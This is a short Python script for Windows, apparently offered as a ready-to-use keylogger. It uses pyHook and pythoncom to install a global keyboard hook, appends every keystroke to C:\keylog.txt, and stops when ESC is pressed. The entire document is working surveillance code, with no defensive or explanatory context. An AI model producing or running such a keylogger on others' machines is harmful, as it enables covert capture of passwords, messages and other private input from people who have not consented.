import os
import sys
import pyHook
import pythoncom
import time

# File path and name
file_path = 'C:\\keylog.txt'  # Change this to a valid directory where you want to store logs

def OnKeyboardEvent(event):
    try:
        if event.Ascii == 27: # ESC key pressed
            print('[*] End of log session')
            return False     # Stop recording

        key = chr(event.Ascii) if event.Ascii < 128 else '[' + str(event.Ascii) + ']' # Handle special characters
    except Exception as e:
        print('[!] Error:', str(e))
        return False

    with open(file_path, 'a') as f:  # Append to the log file
        f.write(key)
        print('[+] Key logged:', key) 

    return True # Continue recording

def main():
    try:
        hooks_manager = pyHook.HookManager()   # Create a hook manager object
        hooks_manager.KeyDown = OnKeyboardEvent  # Define the function to call when a key is pressed
        hooks_manager.HookKeyboard()             # Set the hooks
        pythoncom.PumpMessages()                 # Wait for incoming messages
    except Exception as e:
        print('[!] Error:', str(e))

if __name__ == '__main__':
    main()